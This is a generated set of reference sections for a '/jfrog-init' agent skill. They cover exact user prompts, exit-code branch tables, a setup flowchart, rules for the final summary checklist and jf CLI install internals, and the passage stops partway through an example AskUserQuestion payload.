<!-- GENERATED by scripts/gen-steering.mjs from skills/ — do not edit by hand. -->


## ai-governance-server

# Step 4 — the AI Governance server and project

**Required behavior for Step 4, not optional background.**

Ask each question below as how-to-ask-user.md
describes. Use the question and options as written, in the same order,
and only fill in the `<…>` placeholders. The options are the complete
list. There is no recommendation.

`<server-id>` is the `serverId` the ping reported for the jf CLI
default server, and `<jf-host>` is the host of its `jpdUrl`.

`<ai-governance-server-id>` and `<ai-governance-project>` are set only by
the user's answers below (a saved value counts only once the user picks it)
— never taken from environment variables or MCP entries, and never invented.
Ignore an `info:` line about deprecated environment variables from the
script; don't mention it to the user.

## Which server

**Question:** Is your AI Governance server (where your AI Catalog is)
this same JFrog server (`<jf-host>`), or a different one?

**Options:**

1. **`<saved-server-id>`** — Keep the AI Governance server from your last
   setup (`<saved-host>`).
2. **Same server or no AI Catalog** — Use `<jf-host>`. Pick this too if
   you're not sure.
3. **Different server** — Connect another JFrog Platform for AI
   Governance.

Leave out option 1 unless `get` returned a `serverId` other than
`<server-id>`; that `serverId` is `<saved-server-id>`, and `<saved-host>`
is the host of the `jpdUrl` that `get` returned.
When `get` returned `ambiguous`, run `jfrog-ai-governance-config.mjs list`
and offer each saved `serverId` other than `<server-id>` as its own
option 1, with the host of its `jpdUrl` from `list` as `<saved-host>`.

- **`<saved-server-id>`** → `<ai-governance-server-id>` is
  `<saved-server-id>`. Ping it (below). If the ping's `detail` says
  `no url found in jf config`, the server was removed from the jf CLI
  config since: say "`<saved-server-id>` is no longer in your jf CLI
  config." and ask the server question again without that option.
- **Same server or no AI Catalog** → `<ai-governance-server-id>` is
  `<server-id>`.
- **Different server** → ask in a plain chat message, under the same
  rules as Step 3's URL ask in `jf-config-auth-picker.md`: *"Which
  JFrog server is your AI Governance server? Give its server ID from
  your jf CLI config, or its URL."* Match the answer against
  `jf config show --format=json`:
  - A `serverId` there → that server is `<ai-governance-server-id>`.
  - A URL equal to a server's `url` (a trailing `/`, `/artifactory` or
    `/ui` doesn't matter) → that server's `serverId` is
    `<ai-governance-server-id>`. If several servers have that URL, ask
    which one.
  - Either way, if that is the jf CLI default server, continue as
    **Same server or no AI Catalog**; otherwise ping it (below) — it is
    already connected.
  - A URL no server has → connect it with Step 3's web-login-or-token
    picker and branches in `jf-config-auth-picker.md`, with two
    differences:
    - Web login: the `SERVER_ID=` line that
      `jfrog-login-save-credentials.mjs` prints is
      `<ai-governance-server-id>`.
    - Access token: name the server after the start of the URL's host
      (`mycompany` for `https://mycompany.jfrog.io`); that name is
      `<ai-governance-server-id>`. If jf config already has a server
      with that ID, ask the user for another ID. The command is
      `jf config add <ai-governance-server-id> --url=<url> --interactive`.
  - Not a URL and not a `serverId` there → say it isn't in your jf CLI
    config and ask again.

  The jf CLI default server stays as it is. Then ping
  `<ai-governance-server-id>` (below).

Ping the saved or different server with the same detector and branch
table as the jf CLI default server (`jf-config-auth-picker.md`'s
"Step 4's full branch table"):

```bash
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-server-ping.mjs" "<ai-governance-server-id>"; rc=$?; true
```

## Which project

The AI Governance project is a project on the AI Governance server
chosen above; `<ai-governance-host>` is the host of the `jpdUrl` that
server's ping reported. Without AI Catalog there is no project.

```bash
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-ai-governance-config.mjs" list; rc=$?; true
```

If the entry whose `serverId` is `<ai-governance-server-id>` has a
`project` (`<KEY>`), ask:

**Question:** Keep `<KEY>` as your AI Governance project on
`<ai-governance-host>`?

**Options:**

1. **Yes** — Use `<KEY>` again.
2. **No** — Pick a different project.

- **Yes** → `<ai-governance-project>` is `<KEY>`.
- **No**, or no such entry → run the project picker and follow
  `project-picker.md`:

  ```bash
  node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-project.mjs" "<ai-governance-server-id>"; rc=$?; true
  ```

  The key the user picks, or the value they type, is
  `<ai-governance-project>`. On **No AI Catalog**,
  `<ai-governance-project>` is empty.

If Step 4's save command (`jfrog-ai-governance-config.mjs set`) rejects the
project key, say *"`<input>` isn't a
project key. Which AI Governance project on `<ai-governance-host>` do
you want to use? If you don't use AI Catalog, say so."*, where `<input>` is
the rejected value; the answer is the next `<ai-governance-project>`
(empty if they don't use AI Catalog). Ask this once; if the save command
rejects the second answer too, show its error and stop — nothing is saved,
and the user can run `/jfrog-init` again once they have the key.

`setup.json` holds only public identifiers (server IDs, URLs, project
keys) — never a token.


## batch-walk

# Running everything at once — jfrog-detect-all.mjs

The step numbers on this page are the batch script's own, not the step
numbers of `SKILL.md`.

`node ~/.kiro/jfrog-scripts/jfrog-init/jfrog-detect-all.mjs [server-id] [project-key]` runs Steps 1–7
in order and stops at the first non-green result — except Step 5 going
red/error, Step 5b going red/error, Step 6 going red (ambiguous/404/403), and Step 7 going red
in either of its two non-blocking shapes (exit 1: catalog not hosted /
unreachable / 5xx, or exit 4: reachable but not entitled), all of which
are non-blocking: Steps 1-4 passing is what "green" means here,
and the MCP-plugin, MCP-auth, project-resolution, and catalog-availability
gaps are each reported as separate signals. Step 5b itself only runs when
Step 5 came back green **and** `detectHarness()` returns `opencode` — every
other harness authenticates MCP tools through `jf config` credentials
directly, so there's nothing for it to check. This script makes exactly one
project-resolution attempt per invocation, so it always treats a Step 6 red as
non-blocking — the interactive walk (see Step 4 in `SKILL.md`) is where
the user picks the project. Steps 5's, 6's, and 7's own
`ask`/`error` outcomes (ambiguous server-id, no project input passed,
`jf` missing/credentials rejected) still block, same as every other
step's genuine stop. If no project key is passed, Step 6 emits `ask`
with candidates and the walk halts; the caller re-invokes with the
picked project as arg 2 — unless that `ask` carries `"unresolved":
"server"`, in which case it's a server pick (see `server-picker.md`) and
the re-invocation picks server-id (arg 1) instead.

Exit 0 = Steps 1-4 green (MCP configured or not, MCP token present or not,
MCP server enabled or not, project resolved or not, catalog entitled or
not); exit 1 = something needs fixing. The final JSON line adds
`mcpConfigured: true|false`, `mcpAuthed: "ok" | "missing" |
"not_applicable"`, `mcpResponding: true|false`, `projectResolved:
true|false`, and `catalogEntitled: true|false` so a caller can tell the
exit-0 cases apart — plus `catalogReason: "unreachable" | "not_entitled"`
whenever `catalogEntitled` is `false`, and `mcpRespondingReason:
"not_enabled" | "unreachable"` whenever `mcpResponding` is `false`, so the
Final Summary can name the specific gap instead of a generic one.
`mcpAuthed` is `"not_applicable"` on every harness but OpenCode — there is
no gap to report where the check never runs, and a boolean there would
conflate "no gap" with "not checked". Whenever Steps 1-4 are green, it
saves the server and project with `jfrog-ai-governance-config.mjs`'s
`set` without `--force`: that never switches away from an AI Governance
server already saved and never changes a saved project.
When several servers are saved and none is the default, it saves
nothing; `/jfrog-init` asks which one.


## catalog-runtime-branches

# Step 6 — AI Catalog reachable & entitled: mechanics and branches

Two sub-checks against
`<JPD>/ml/core/api/v1/mcp-registry/ml-projects?pageSize=1` (where
`<JPD>` is the URL stored in `jf config` for the AI Governance server —
this skill never uses a separate `JFROG_PLATFORM_URL` env var), both
must pass. This step is **purely about AI Catalog access** — no
runtime checks (Node lives in Step 1; `uv` / `docker` are per-MCP
concerns, not this skill's).

1. **Anonymous** GET — proves the endpoint is deployed at this JPD.
   `2xx/401/403/405/406` = up; `404` / connection failure = red.
2. **Authenticated** GET to the same path, with the bearer token (or
   user+password) extracted from `jf config export` — same credential
   source `jf` itself uses (token / user+password / SSO refresh,
   whatever's stored), so the skill never asks for or invents
   credentials, and the token only lives in memory for this one
   request. `2xx` = user is **entitled** to read the AI Catalog on
   this JPD; `403` = reachable but **not entitled**, non-blocking.
   `401` means the credentials themselves were rejected — that says
   nothing about entitlement, so it is treated as a blocking error
   instead (see Exit 3 below).

Splitting reachability from entitlement produces two distinct
outcomes: check 1 red = "this JPD doesn't host AI Catalog, or it's
unreachable right now"; check 2's `403` = "catalog is up but your
user isn't entitled." Neither is a setup failure — both are
non-blocking permissions/availability gaps the rest of the walk doesn't
depend on (see the exit-code branches below). Check 2's `401` is
different — it means `jf`'s own credentials are invalid or expired,
which is a genuine setup problem (Exit 3).

**Required branches:**

- **Exit 0 (green)** → done. All checks pass, including entitlement.
- **Exit 1 (red)** → anon probe 404 / connection failure / 5xx — the
  platform may not host AI Catalog, or it's unreachable right now.
  **Non-blocking** — same reasoning as Exit 4 below: Steps 1-4 are
  this skill's core prerequisites, and none of them depend on the AI
  Catalog being present. Proceed to the Final Summary; it shows
  `ℹ️ … AI Catalog not available` (`catalogReason: "unreachable"` in
  `jfrog-detect-all.mjs`'s summary — see `batch-walk.md`).
- **Exit 3 (error)** → `jf` missing, the authed probe returned `401`
  (credentials themselves rejected — re-run `jf config add
  --interactive`), or an unexpected HTTP code (e.g. a broken `jf`
  config surfacing here instead of at Step 4). This is the one genuine
  stop this step has — a real error, not a "catalog isn't available"
  gap.
- **Exit 4 (not entitled)** → catalog is reachable but the authed probe
  returned `403`. **Non-blocking** — proceed to the Final Summary, with
  the same line as Exit 1 (`catalogReason:
  "not_entitled"`). The detector's `detail` names the specific endpoint
  path (`/ml/core/api/v1/mcp-registry`) and the role the admin needs to
  grant (typically "AI Catalog Read" or "Application Admin"), so the
  user can forward an actionable request rather than a shrug.

Exit 1 and Exit 4 are deliberately handled the same way at the walk
level (see `batch-walk.md`) — both leave `catalogEntitled: false`, and
only differ in `catalogReason`. The Final Summary says "AI Catalog not
available" for both, marked ℹ️ (see `final-summary-rendering.md`);
`catalogReason` answers the user if they ask why.

**Never** grant a role or invent a project.


## final-summary-rendering

# Final summary — recap rendering rules

**Give the user a short recap, not the raw checklist.** See
"Customer-facing output" in `SKILL.md` — no step numbers, no raw JSON.
Render a short, emoji-based checklist, not a prose paragraph or a
five-line plain-text list. Three grouped lines cover all five checks:

- **JF CLI & Config** — `jf` installed and connected to a server. Always
  fully resolved here — this checklist only renders once every
  prerequisite up through server connectivity has passed (see "Anything
  else red" below for the alternative).
- **JFrog MCP Plugin** — the MCP plugin check.
- **Project & AI Catalog** — the project-resolution and AI-Catalog-access
  checks, together.

Skip the Node.js setup step — implementation detail, not user-facing.

**Rules for the checklist:**
1. Do **not** use the word "done" anywhere in it.
2. Keep those checks in exactly these three grouped lines — never
   expand back out to five.
3. All three groups fully resolved → use this exact format, verbatim:

   > ✨ **JFrog initialization complete!**
   > ✅ JF CLI & Config
   > ✅ JFrog MCP Plugin
   > ✅ Project & AI Catalog

4. A group with something outstanding gets ⚠️ instead of ✅, plus a
   short fact after an em dash:

   > ✨ **JFrog initialization complete!**
   > ✅ JF CLI & Config
   > ⚠️ JFrog MCP Plugin — not configured
   > ✅ Project & AI Catalog

   For the merged **Project & AI Catalog** line, a user who answered
   **No AI Catalog** has no project and nothing outstanding. An AI Catalog
   that is not available (Step 6 exit 1 or exit 4) is information, not a
   problem: `ℹ️ Project & AI Catalog — AI Catalog not available`. When the
   user answered **No AI Catalog** but Step 6 found the AI Catalog
   available (exit 0), say so once, also as information:
   `ℹ️ Project & AI Catalog — no project; AI Catalog is available on
   <ai-governance-host> (run /jfrog-init to pick a project)`.

5. **Step 7 gets a fourth checklist line, but only when it ran** —
   nothing appears when it was skipped:
   - **Success** — `✅ JFrog Marketplace`, plus this trailing sentence
     after the checklist block, in this exact wording:

     > Added the JFrog marketplace `<marketplace-name>` to Claude Code.
     > Browse available plugins with `/plugins`, or install directly with
     > `claude plugin install <plugin>@<marketplace-name>`

   - **Red** — `⚠️ JFrog Marketplace — not registered`, and no trailing
     sentence.

6. **When the AI Governance server is not the jf CLI default server**,
   add this sentence after the checklist block (after Step 7's
   sentence, if any):

   > AI Governance uses `<ai-governance-server-id>`
   > (`<ai-governance-host>`), project `<ai-governance-project>`; other
   > JFrog commands use `<server-id>` (`<jf-host>`).

   Leave out `, project <ai-governance-project>` when it is empty.
   `<ai-governance-host>` and `<jf-host>` are the hosts of the two
   servers' `jpdUrl`s from Step 4's pings; they can be the same host.

**If the user asks why** (troubleshooting reference — not part of the render itself):

Never phrase a ⚠️ line as a failure or as something the user needs to
fix before continuing — all of them are non-blocking by design. The
short fact after the em dash is the same underlying cause this skill
has always surfaced, just worded without "pending":

- **Step 5 red/error (MCP plugin not configured):** `not configured`.
  If the user asks why or how to fix it, that's when the specific cause
  from Step 5's `detail` comes in — either run
  `jfrog-reinstall-jfrog-plugin.mjs` (see Step 5) for the per-harness
  reinstall remedy, or point at resolving `jf config`, matching
  whichever cause Step 5 actually reported.
- **Step 5 MCP status** (only when the config check above is green) — the
  **probe** decides, the only signal tied to *this* JPD:
  - exit 4 → ⚠️ `not enabled on this JPD` (+ ask admin, docs from `detail`)
  - exit 1 → ⚠️ `could not confirm it's enabled`
  - exit 0 → the endpoint is on, but that's the server, not your sign-in. For
    *this* JPD, cheapest first:
    - **✅** — already conclusive (no extra call): the `jfrog` tools show
      connected/authorized and you can use them, or you've already used one this
      walk.
    - Else, if a `jfrog` tool is callable without starting a sign-in, **make one
      cheap read-only call**: returns data → **✅**; any other result
      (`401`/`needsAuth`, an error, or a timeout) → ⚠️.
    - **⚠️ `enabled — sign in to use it`** (the default) — no `jfrog` tool callable
      this turn, or confirming would need a sign-in. (A `401` challenge or a
      merely-listed tool is never ✅ **on its own**.)
    - Re-decide every walk (never reuse a stale result); offer sign-in **after the
      summary, never mid-walk**.
- **Step 5b red (OpenCode OAuth incomplete):** `not authenticated`. If
  the user asks, that's when `opencode mcp auth jfrog` comes in.
- **Step 6 returned exit 4 (not entitled):** `AI Catalog not
  available`, ℹ️ (rule 4). If the user asks for the fix: ask your
  JFrog admin for the "AI Catalog Read" role to browse or install MCPs
  from the catalog.
- **Step 6 returned exit 1 (catalog not hosted / unreachable):** `AI
  Catalog not available`, ℹ️ (rule 4). No fix instruction; there may
  be nothing to fix (this JPD may simply not host the AI Catalog).
- **Something happened this walk** (Node.js/`jf` CLI installed, `jf
  config` connected, a project chosen in Step 4, an MCP placeholder
  substituted in Step 5, etc.): still the same checklist — the action
  itself isn't called out per-line, ✅ is ✅ regardless of whether it
  needed fixing this walk.
- **Anything else red** (Steps 1-4 not all green): one or two sentences
  naming what's blocking and what to do next, no checklist — there's
  nothing to check off yet. Include the raw detector error line if it
  helps debug, without the JSON wrapper.


## flow-diagram

# /jfrog-init — full flow diagram

Visual companion to the numbered Steps in `SKILL.md`. Every decision
node here is also fully documented — including the exact user-facing
wording — in the corresponding Step section of `SKILL.md`; this diagram
adds nothing new, it's a compressed map of that same prose for
at-a-glance orientation. `SKILL.md`'s Step-by-step text is the
authoritative source for wording and behavior — follow it literally.

```mermaid
flowchart TD
    Start(["/jfrog-init"]) --> S1

    S1["1. Node.js >= 18 installed? (no script — node --version / npx --version)"]:::stepBox
    S1 -->|no| ASKNODE["AskUserQuestion: Install Node.js now? Yes/No"]:::fixBox
    ASKNODE -->|Yes, macOS/Linux| NVMINSTALL["Install nvm (pinned version) + nvm install --lts"]:::autoBox
    ASKNODE -->|Yes, Windows| WINGETNODE["winget install OpenJS.NodeJS.LTS"]:::autoBox
    ASKNODE -->|No| STOP0["STOP: cannot proceed without Node"]:::stopBox
    NVMINSTALL -->|failed| F1["Fall back: ask user to install Node.js >= 18 manually"]:::fixBox
    NVMINSTALL -->|ok| S2
    WINGETNODE --> F1W["Tell user: open a new terminal, re-run /jfrog-init"]:::fixBox
    S1 -->|yes| S2

    S2["2. jf CLI installed and >= 2.106.0?"]:::stepBox
    S2 -->|missing| ASKJF["AskUserQuestion: Install JFrog CLI? Yes/No"]:::fixBox
    S2 -->|outdated| ASKJFU["AskUserQuestion: Update JFrog CLI? Yes/No"]:::fixBox
    ASKJF -->|Yes| INSTJF["jfrog-install-jf-cli.mjs: Plan A npm install -g jfrog-cli-v2-jf"]:::autoBox
    ASKJFU -->|Yes| INSTJF
    ASKJF -->|No| STOP0J["STOP: cannot proceed without jf"]:::stopBox
    ASKJFU -->|No| STOP0J
    INSTJF -->|npm exited 0, but resolving jf is shadowed by an earlier install on PATH| SHADOW["Report shadowing — move npm's bin ahead on PATH, or remove the other install"]:::fixBox
    SHADOW --> PLANC
    INSTJF -->|npm failed, or exited 0 but jf still isn't resolving up to date and not shadowed, and a private registry is configured| PLANB["Plan B: retry npm install against the public registry"]:::autoBox
    PLANB -->|jf now resolves up to date| S2RE
    PLANB -->|still not up to date| PLANC
    INSTJF -->|npm missing, or Plan A/B failed to leave an up-to-date jf on PATH| PLANC["Plan C: direct binary download to ~/.jfrog/bin, checksum-verified, runs jf --version to confirm"]:::autoBox
    PLANC -->|Windows| WINPS["Print PowerShell one-liner — user runs it themselves, then re-runs /jfrog-init"]:::fixBox
    PLANC -->|macOS/Linux| S2RE
    INSTJF -->|npm succeeded and jf now resolves >= 2.106.0| S2RE["Re-check: installed and >= 2.106.0?"]:::stepBox
    S2RE -->|still missing/outdated| STOP1["STOP: show raw install error"]:::stopBox
    S2RE -->|ok| S3
    S2 -->|yes| S3

    S3["3. jf connected to a server?"]:::stepBox
    S3 -->|no| ASKMETHOD["AskUserQuestion: Web login or Access token?"]:::fixBox
    ASKMETHOD -->|Web login| WEBLOGIN["Register session, show code/link, retrieve + save credentials — all in-session, this skill's own local scripts"]:::autoBox
    WEBLOGIN --> S3ASKW["AskUserQuestion: Did you finish logging in? Yes/No"]:::fixBox
    S3ASKW -->|Yes| S3
    S3ASKW -->|No| STOP0B["STOP: user cancelled"]:::stopBox
    ASKMETHOD -->|Access token| F3["Print one command, --url pre-filled — user runs it themselves in their own terminal, pastes the token"]:::fixBox
    F3 --> S3ASK["AskUserQuestion: Did you finish running that command? Yes/No"]:::fixBox
    S3ASK -->|Yes| S3
    S3ASK -->|No| STOP0B
    S3 -->|yes| S4

    S4["4. Server reachable and credentials valid?"]:::stepBox
    S4 -->|multiple servers, no default| ASKSRV["AskUserQuestion: pick server-id"]:::fixBox
    ASKSRV --> S4
    S4 -->|reachable, but token invalid/expired| F4["Print one command, --url and --server-id pre-filled (token-only, no web option — avoids a duplicate server) — user runs it themselves"]:::fixBox
    F4 --> S4ASK["AskUserQuestion: Did you finish running that command? Yes/No"]:::fixBox
    S4ASK -->|Yes| S4
    S4ASK -->|No| STOP0C["STOP: user cancelled"]:::stopBox
    S4 -->|unreachable/timeout/other| STOP2["STOP: show raw error (network/URL hint included)"]:::stopBox
    S4 -->|yes| GET["jfrog-ai-governance-config.mjs get (corrupt: one line, it will be replaced)"]:::stepBox

    GET --> ASKGOV["AskUserQuestion: AI Governance server — saved server (if get returned another serverId), Same server or no AI Catalog, Different server"]:::fixBox
    ASKGOV -->|same server / no AI Catalog| LIST
    ASKGOV -->|saved server| PINGGOV
    ASKGOV -->|different server| ASKURL["Plain chat: AI Governance server"]:::fixBox
    ASKURL -->|the jf CLI default server| LIST
    ASKURL -->|another server in jf config| PINGGOV
    ASKURL -->|not in jf config yet| CONNECT["Web login or access token (Step 3's picker, jf CLI default server unchanged)"]:::fixBox
    CONNECT --> PINGGOV["Ping the AI Governance server (Step 4's branch table)"]:::stepBox
    PINGGOV -->|yes| LIST

    LIST["jfrog-ai-governance-config.mjs list"]:::stepBox
    LIST -->|saved project for this server| ASKKEEP["AskUserQuestion: Keep KEY as your AI Governance project? Yes/No"]:::fixBox
    LIST -->|none| ASKPROJ
    ASKKEEP -->|Yes| SET
    ASKKEEP -->|No| ASKPROJ["AskUserQuestion: first 2 projects (from enumeration), No AI Catalog, or Other to type one"]:::fixBox
    ASKPROJ -->|picked or typed| SET
    ASKPROJ -->|enumeration failed: jf missing / credentials rejected| STOPCREDS["STOP: show raw error (re-auth via the Step 3 picker)"]:::stopBox

    SET["jfrog-ai-governance-config.mjs set --force"]:::autoBox
    SET -->|exit 2, invalid project key| ASKKEY["Plain chat: ask for the project key again (once; rejected again: STOP, nothing saved)"]:::fixBox
    ASKKEY --> SET
    SET -->|exit 1, or any other exit 2| STOPSET["STOP: show its error line"]:::stopBox
    SET -->|exit 0| S5

    S5["5. Plugin mcp.json has a valid jfrog entry? (auto-substitutes a JFROG_PLATFORM_URL/JFROG_URL placeholder inline, if present)"]:::stepBox
    S5 -->|substitution needed, server-id ambiguous| ASKSRV5["AskUserQuestion: pick server-id"]:::fixBox
    ASKSRV5 --> S5
    S5 -->|missing/invalid/no entry, incl. substitution failure| F5["Note: reinstall or update the JFrog plugin, or resolve jf config (non-blocking)"]:::fixBox
    F5 --> S6
    S5 -->|yes, valid url| S5R["5b. JFrog MCP server enabled on this JPD? (jfrog-detect-jfrog-mcp-responding.mjs, anonymous GET &lt;JPD&gt;/mcp — non-blocking)"]:::stepBox
    S5R -->|not_enabled: ask admin / unreachable: couldn't confirm| F5R["Note: surface in Final Summary (non-blocking)"]:::fixBox
    S5R -->|enabled: ✅ if signed in to this JPD, else offer sign-in AFTER Final Summary| S6
    F5R --> S6

    S6["6. AI Catalog reachable and user entitled? (AI Governance server)"]:::stepBox
    S6 -->|anon 404 / connection failure / 5xx, exit 1| F6U["ℹ️ AI Catalog not available: catalogReason=unreachable — JPD may not host AI Catalog, or it's down right now (non-blocking)"]:::fixBox
    F6U --> S7CHECK
    S6 -->|authed 401 or 403, not entitled, exit 4| F6E["ℹ️ AI Catalog not available: catalogReason=not_entitled — ask JFrog admin for AI Catalog Read role (non-blocking)"]:::fixBox
    F6E --> S7CHECK
    S6 -->|jf missing / credentials rejected / unexpected response shape, exit 3| STOP6["STOP: show raw error"]:::stopBox
    S6 -->|yes, entitled, exit 0| S7CHECK

    S7CHECK{"Step 6 green AND harness == Claude Code? (detectHarness() reused from Step 5)"}:::stepBox
    S7CHECK -->|no| DONE
    S7CHECK -->|yes| S7["7. Claude agent-plugin marketplace registered? (AI Governance server and project)"]:::stepBox
    S7 -->|exit 0, success| F7OK["Final Summary: ✅ JFrog Marketplace, plus the trailing sentence"]:::autoBox
    S7 -->|exit 1 or 3, failed| F7BAD["Final Summary: ⚠️ JFrog Marketplace — not registered, no cause"]:::fixBox
    F7OK --> DONE
    F7BAD --> DONE

    DONE(["JFrog init complete"]):::doneBox

    classDef stepBox fill:#e8f0fe,stroke:#1a73e8,color:#000
    classDef fixBox fill:#fff4e5,stroke:#f9a825,color:#000
    classDef autoBox fill:#e6f4ea,stroke:#137333,color:#000
    classDef doneBox fill:#e6f4ea,stroke:#137333,color:#000
    classDef stopBox fill:#fce8e6,stroke:#c5221f,color:#000
```




## how-to-ask-user

# How to ask the user questions

When the skill needs a Yes/No answer, a selection, or any other input
from the user, use the **native interactive prompt tool** built into
your harness so the user can click or select rather than type:

| Harness         | Preferred tool         |
|-----------------|------------------------|
| Claude Code     | `AskUserQuestion`      |
| Codex           | `request_user_input`   |
| Kiro / Kiro CLI | none — no native prompt tool exists; go straight to the plain-text fallback |
| Junie (IDE / CLI) | none — no native prompt tool exists; go straight to the plain-text fallback |

Each reference file specifies the question text and option labels; use
your harness's native tool to present them. Native prompt tools already
offer a free-text "Other" fallback for values not in the list — don't
add a duplicate "Other" option yourself.

**Fallback**: if no native prompt tool is available, or the tool
returns without a selection, surface the question as plain text in
your reply — never silently stop without presenting it.

**Kiro / Kiro CLI / Junie**: check `$JFROG_INIT_HARNESS` (exported by
Step 5; before that, whether you are Kiro or Junie) before reaching for `AskUserQuestion` — if it's `kiro`,
`kiro-cli`, or `junie`, skip the tool call entirely and use the plain-text
fallback directly. Calling it anyway surfaces a "tool does not exist" error
to the user before you fall back.


## invoking-and-output-rules

# Operating rules: silent walk, exit codes, and flow

## Customer-facing output

**The user does not need to see the checklist you are walking, but does
need to see what actually happened.** Run the detectors silently,
capture their output for your own reasoning, and surface only what the
user needs to know or act on:

- **Do not** narrate step numbers ("Step 1…", "moving to Step 3…")
  while the walk is in progress.
- **Do not** paste detector JSON, exit codes, or shell command output
  into the reply.
- **Do not** narrate the branch-selection reasoning behind an
  `AskUserQuestion` or plain-text prompt — e.g. explaining that
  `unresolved` wasn't `"server"`, or that `candidatesWithNames` had two
  or more entries, so this is "the generic ask using the first two
  candidates." That reasoning (in `server-picker.md`, `project-picker.md`,
  and the other reference docs' branch tables) is written for you to
  follow silently, not to summarize out loud — the field names in it are
  never user-facing. The only output the user sees at an ask point is
  the prompt itself.
- **Do not** narrate whether the `AskUserQuestion` tool is available in
  the current harness before falling back to the plain-text prompt
  (e.g. "the AskUserQuestion tool isn't available here, I'll present
  this as a plain question instead"). If it isn't available, silently
  use the plain-text fallback already documented for that ask point.
- **Do not** announce that you're about to run the checklist, or name
  which check comes first — not even generically ("I'll run the setup
  checklist silently, starting with the JFrog CLI check" is itself a
  violation: it names a step while claiming to be silent). The same
  applies to reading reference docs: "I'll start by reading the flow
  docs" is a preamble. Silently means no preamble message at all — not
  before running commands, not before reading files. Say nothing until
  you have something the user needs to act on (an ask, a failing result)
  or the final summary.

Instead:

- **When everything passes**, give a short recap in the final summary
  (see SKILL.md's "Final summary" section): a short, emoji-based checklist — JF CLI
  & Config, JFrog MCP Plugin, Project & AI Catalog — so the user sees
  the end state of every check at a glance, not raw step numbers and
  not the Node.js check (an implementation detail, not user-facing).
- **When something fails**, say *what's wrong in plain English* and
  *what the user needs to do next*, in one or two sentences. Show the
  exact command they need to run (they must see what they're
  approving).
- **On failure, the raw detector error line is fair game** to include
  verbatim as a debugging aid — one line, without the JSON wrapper.

SKILL.md documents the flow **for you (the model)**, not for the user.

## Invoking scripts: exit codes are signal, not failure

Every detector command shown in SKILL.md signals a failure or an ask via a
non-zero exit code, by design — append `; rc=$?; true` when invoking
any of them. **`rc=$?` is not optional**: every Step's branch table
in SKILL.md keys off the exit code, and a bare `; true` throws it away, so
every failure and ask silently reads as success. **Read
the `script-invocation` section of the `#jfrog-init-references` steering in full** before running any command
in this walk — the exact pattern and why it's required, not optional
background.

## Flow

**Follow this flow literally.** Every decision node is covered by a
detector or fix script in SKILL.md; every user-facing prompt uses the exact
wording documented in the corresponding step. Do not reorder, do not
skip, do not narrate the diagram to the user. Read
the `flow-diagram` section of the `#jfrog-init-references` steering for the full flowchart before starting a
walk — the same logic as SKILL.md's Steps, drawn as a map.


## jf-cli-install-internals

# jfrog-install-jf-cli.mjs — installation internals

Background for Step 2 of `/jfrog-init` (`SKILL.md`). The model doesn't
need this to execute the step — `jfrog-install-jf-cli.mjs` handles all
of it and reports success/failure on stdout and its exit code — but it
explains what the script actually does, for debugging or when a user
asks how the install works.

**Deliberately does not use** the base skill's
[the `jfrog-cli-install-upgrade` section of the `#jfrog-references` steering](the `jfrog-cli-install-upgrade` section of the `#jfrog-references` steering)
(`brew install jfrog-cli` / a Linux-only curl one-liner, no Windows
guidance). This walk's primary method is one command that behaves
identically across macOS, Linux, and Windows without branching on OS —
`npm install -g jfrog-cli-v2-jf` — so it uses that instead. If npm
itself can't complete the install (missing, or a permissions error like
a global prefix that needs `sudo`), the script falls back to a
checksum-verified direct binary download with its own Windows handling.

`jfrog-install-jf-cli.mjs` tries progressively more self-contained
install methods, falling through only when one genuinely fails:

1. **Plan A — npm** (JFrog's own documented method:
   docs.jfrog.com/integrations/docs/download-and-install-the-jfrog-cli#npm):
   `npm install -g jfrog-cli-v2-jf` against whatever registry npm is
   already configured for. No PATH/shell-rc changes here: npm's global
   bin directory is expected to already be on PATH. This works
   identically on macOS, Linux, and Windows, so there's no OS-specific
   branch for this plan.
2. **Plan B — public registry retry**: triggered whenever Plan A's `npm`
   command itself fails, *or* it exits 0 but the `jf` that resolves on
   PATH afterward still isn't at the required version — provided that
   stale `jf` is npm's own install and not a different, older `jf`
   earlier on PATH shadowing it. Shadowing is reported directly and
   skips straight to Plan C instead: retrying against a different
   registry can't fix a PATH-ordering problem. If npm is configured for
   a registry other than the
   public one (common on a company machine, pointed at a
   private/corporate mirror), the exact same install is retried with
   `--registry=https://registry.npmjs.org/` — this one command only,
   never touching the user's saved npm config. `jfrog-cli-v2-jf` is a
   public package, so a private registry's own (possibly stale) auth
   says nothing about whether the package itself is reachable.
3. **Plan C — direct binary download**: if npm is missing, or both A
   and B failed for any other reason (observed in practice: a global
   npm prefix that requires `sudo`), downloads the first-party `jf`
   binary from `releases.jfrog.io` straight to `~/.jfrog/bin` — a
   user-owned prefix that never needs elevated permissions — and
   verifies it against the SHA-256 checksum Artifactory reports for that
   same artifact (catches a truncated/corrupted transfer, not an
   independent signature). Unlike Plans A/B, `~/.jfrog/bin` isn't on
   PATH by default, so a successful Plan C also appends a PATH line to
   the user's shell rc file (idempotent) and prints one for the caller
   to `eval` immediately, so `jf` resolves both in future terminals and
   in the *current* process without the user doing anything.
   **Windows**: Plan C's direct-download path isn't reliable there, so
   it instead prints a PowerShell one-liner — installing to a user-owned
   path and prepending to the user-scope `Path` via
   `[Environment]::SetEnvironmentVariable(..., 'User')`, no elevation
   needed. Reads the existing user-scope value first rather than using
   `setx PATH "...;$env:Path"`, which would copy the *combined*
   machine+user PATH into the user variable (duplicating every
   machine-level entry into it, permanently) and silently truncate past
   `setx`'s 1024-character limit. The whole script exits 1 so Step 2 can
   relay it to the user.

Only if all three plans fail does the script print the plain
`npm install -g jfrog-cli-v2-jf` command and exit 1, for the user to
diagnose and run themselves.

**Known trade-off of Plans A/B, called out in JFrog's own docs and not
something this script can detect or fix**: if the user relies on a
shim-based version manager (`nvm` / Volta) alongside another `jf`
install (Homebrew, curl, or Plan C itself), the version manager's
`bin/` takes PATH priority, so the npm-installed `jf` silently wins
regardless of what those other installs report.


## jf-cli-install-prompt

# Step 2 — the install prompt

**Required behavior for Step 2's red branch, not optional background.**
When `jfrog-detect-jf-cli.mjs` exits red with `reason: "missing"` (`jf`
not found on PATH at all), call `AskUserQuestion` with this exact
payload shape (arrays and options nested correctly; the tool rejects
flat/mis-shaped inputs with `InputValidationError`):

```json
{
  "questions": [
    {
      "question": "JFrog CLI isn't installed. Install it now?",
      "header": "Install jf",
      "multiSelect": false,
      "options": [
